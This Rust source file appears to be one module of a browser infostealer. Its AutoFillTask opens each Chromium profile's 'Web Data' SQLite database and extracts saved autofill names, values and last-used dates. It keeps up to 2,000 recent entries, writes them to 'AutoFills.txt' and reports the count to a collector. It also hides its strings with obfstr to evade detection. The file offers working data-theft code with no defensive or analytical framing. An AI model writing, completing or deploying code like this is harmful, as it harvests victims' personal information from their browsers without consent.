use crate::alloc::borrow::ToOwned;
use crate::chromium::BrowserData;
use crate::{read_and_collect_unique_records, to_string_and_write_all, AutoFill, SqliteDatabase};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use filesystem::FileSystem;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};

const AUTOFILL_NAME: usize = 0;
const AUTOFILL_VALUE: usize = 1;
const AUTOFILL_DATE_LAST_USED: usize = 4;

pub(super) struct AutoFillTask {
    browser: Arc<BrowserData>,
}

impl AutoFillTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for AutoFillTask {
    parent_name!("AutoFills.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut autofills) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("Web Data"),
            s!("Autofill"),
            extract_autofill_from_record,
        ) else {
            return;
        };

        autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
        autofills.truncate(2000);

        collector
            .get_browser()
            .increase_auto_fills_by(autofills.len());

        let _ = to_string_and_write_all(&autofills, "\n\n", filesystem, parent);
    }
}

fn extract_autofill_from_record<R: TableRecord>(record: &R) -> Option<AutoFill> {
    let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
    let name = record.get_value(AUTOFILL_NAME)?.as_string()?;
    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?;

    Some(AutoFill {
        name,
        value,
        last_used,
    })
}
